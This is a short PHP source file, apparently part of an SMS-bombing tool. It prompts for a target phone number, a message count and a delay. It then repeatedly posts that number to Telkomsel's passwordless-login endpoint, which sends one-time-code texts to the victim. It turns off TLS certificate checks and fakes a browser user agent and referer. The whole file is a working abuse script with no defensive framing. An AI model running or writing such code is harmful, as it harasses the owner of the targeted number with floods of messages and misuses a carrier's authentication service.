<?php

function telkom($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        curl_exec ($ch);
        print ".";
        curl_close ($ch);
        sleep($wait);
        $x++;
        flush();
    }
}
function smstelkom(){
    include 'main/config.php';
    echo "$cyan Target$red >$white ";
    $nomor = trim(fgets(STDIN));
    echo "$cyan Jumlah$red >$white ";
    $jumlah = trim(fgets(STDIN));
    echo "$cyan Delay$red >$white ";
    $jeda = trim(fgets(STDIN));
    print "\n";
    print "$yellow Processing";
    telkom($nomor, $jumlah, $jeda);
    print "\n";
    print "$cyan Done !!\n\n";
}

?>